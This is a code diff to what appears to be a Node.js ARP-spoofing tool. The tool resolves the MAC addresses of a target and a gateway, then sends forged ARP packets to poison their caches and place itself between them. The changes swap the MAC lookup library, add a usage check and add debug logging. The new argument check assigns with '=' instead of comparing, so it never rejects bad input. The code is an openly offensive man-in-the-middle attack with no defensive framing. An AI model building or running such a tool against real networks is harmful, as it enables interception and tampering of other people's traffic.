@@ -4,7 +4,7 @@ var Cap = require('cap').Cap,
   ip = require("ip"),
   timers = require("timers"),
   device = Cap.findDevice(ip.address()),
-  getmac = require('getmac').getMac,
+  os = require('os'),
   Q = require('q'),
   filter = 'arp',
   bufSize = 10 * 1024 * 1024,
@@ -15,15 +15,20 @@ var Cap = require('cap').Cap,
   },
   attacker = {
     ip: ip.address(),
-    mac: null
+    mac: null,
+    interface: device,
   };
 
 var target1 = { ip: null, mac: null },
   target2 = { ip: null, mac: null };
 var targets = [target1, target2]
-if(process.argv.length > 2) {
+
+if(process.argv.length = 4) {
   target1.ip = process.argv[2];
   target2.ip = process.argv[3];
+} else {
+  console.log("Usage: node poison <target_ip> <gateway_ip>");
+  process.exit();
 }
 
 console.log("WARNING: If IP forwarding is not enabled, targets may see a loss in connectivity");
@@ -40,17 +45,17 @@ Q.nfcall(findOurHardwareAddress)
 
 
 function findOurHardwareAddress(next) {
-  // Finds the hardware (MAC) addresses of the host and targets
-  getmac((err, mac) => {
-    console.log("Attacker MAC:", mac);
-    attacker.mac = mac;
-    next();
-  });
+  // Finds the hardware (MAC) addresses of the host 
+  var interfaces = os.networkInterfaces(); 
+  attacker.mac = interfaces[attacker.interface][0].mac.split(":").join("-");
+  
+  console.log("Attacker MAC:", attacker.mac);
+
+  next();
 }
 
 function findTargetHardwareAddresses(next) {
   var deferred = Q.defer();
-
   arpRequest(target1, function (mac) {
     target1.mac = mac;
 
@@ -79,7 +84,6 @@ var createSpoofPacket = function (src, dst, buf) {
 
   setIP(packet.arp.sender_ip, src.ip);
   setIP(packet.arp.target_ip, dst.ip);
-
 
   return packet.buffer;
 };
@@ -131,30 +135,33 @@ var maintainPoison = function(target1, target2) {
 var arpRequest = function(target, next) {
   var c = new Cap();
   var packet = createARPPacket();
-
-  packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);
+  
+packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);
 
   packet.arp.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
-  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
+  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.eth.target_mac.length);
 
+  console.log("Sending as " + attacker.mac);
   setMac(packet.eth.sender_mac, attacker.mac);
   setMac(packet.arp.sender_mac, attacker.mac);
   setIP(packet.arp.sender_ip, attacker.ip);
   setIP(packet.arp.target_ip, target.ip);
-
+  
   c.open(device, filter, bufSize, socketBuffer);
-  c.setMinBytes(42); // Length of an ARP packet
-
+  
+  c.setMinBytes &&  c.setMinBytes(42); // Length of an ARP packet
   console.log("Sending ARP Request for ", target.ip);
-  c.send(packet.buffer, packet.buffer.length);
-
+  
   c.on("packet", (nbytes) => {
+    console.log("Packet received");
+
     var response = createARPPacket(socketBuffer.slice(0, nbytes));
 
     if(response.arp.operation.readInt16BE(0) === OPERATION.REPLY) {
       var mac = buf2macString(response.arp.sender_mac);
       var senderIp = buf2ipString(response.arp.sender_ip);
 
+      console.log(mac + " at " + senderIp);
       if(typeof mac !== "undefined" && senderIp === target.ip) {
         c.close();
         next(mac);
